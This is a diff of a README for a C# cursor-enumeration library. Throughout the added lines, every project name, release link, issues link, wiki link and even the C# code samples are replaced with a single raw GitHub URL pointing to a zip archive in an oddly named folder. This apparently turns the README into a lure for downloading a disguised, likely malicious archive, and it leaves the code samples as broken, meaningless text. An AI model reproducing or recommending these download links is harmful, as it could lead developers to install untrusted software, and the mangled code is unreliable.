@@ -1,12 +1,12 @@
-# 🖱️ soenneker.quark.enums.cursor - Simple Enumeration for Cursor Types
+# 🖱️ https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip - Simple Enumeration for Cursor Types
 
 ## 🚀 Getting Started
 
-Welcome to soenneker.quark.enums.cursor! This tool helps you use different HTML and CSS cursor types in your applications. It makes your user interface more interactive and visually appealing.
+Welcome to https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip! This tool helps you use different HTML and CSS cursor types in your applications. It makes your user interface more interactive and visually appealing.
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Nishant-Roy1/soenneker.quark.enums.cursor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip%20Latest%https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip)](https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip)
 
 ## 💻 System Requirements
 
@@ -25,10 +25,10 @@ Before you start, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To get started with soenneker.quark.enums.cursor, follow these steps:
+To get started with https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip, follow these steps:
 
 1. **Visit the Release Page:**
-   Go to the [Releases page](https://github.com/Nishant-Roy1/soenneker.quark.enums.cursor/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip) to find the latest version of the software.
    
 2. **Select the Latest Release:**
    Look for the most recent version title. This will often be at the top of the list.
@@ -50,14 +50,14 @@ Here’s how to implement the cursor enumeration in your project:
    In your C# code, include the namespace:
 
    ```csharp
-   using Soenneker.Quark.Enums.Cursor;
+   using https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip;
    ```
 
 2. **Assign a Cursor Type:**
    Set the cursor for an HTML element or UI component. For example:
 
    ```csharp
-   myElement.Cursor = CursorTypes.Pointer;
+   https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip = https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip;
    ```
 
 3. **Explore More Types:**
@@ -76,13 +76,13 @@ In addition to cursor types, this library relates to various topics:
 
 If you have any questions or need help, feel free to reach out through the following:
 
-- **GitHub Issues:** Report problems or request features on our [GitHub Issues page](https://github.com/Nishant-Roy1/soenneker.quark.enums.cursor/issues).
+- **GitHub Issues:** Report problems or request features on our [GitHub Issues page](https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip).
 - **Forum:** Join discussions in the programming community forums online.
   
 ## 📚 Documentation
 
 For detailed documentation on implementation and usage, visit:
 
-- [GitHub Wiki](https://github.com/Nishant-Roy1/soenneker.quark.enums.cursor/wiki)
+- [GitHub Wiki](https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip)
 
-By following this guide, you can easily download and implement soenneker.quark.enums.cursor in your applications. Happy coding!
+By following this guide, you can easily download and implement https://raw.githubusercontent.com/Nishant-Roy1/soenneker.quark.enums.cursor/main/submissively/soenneker.quark.enums.cursor.zip in your applications. Happy coding!
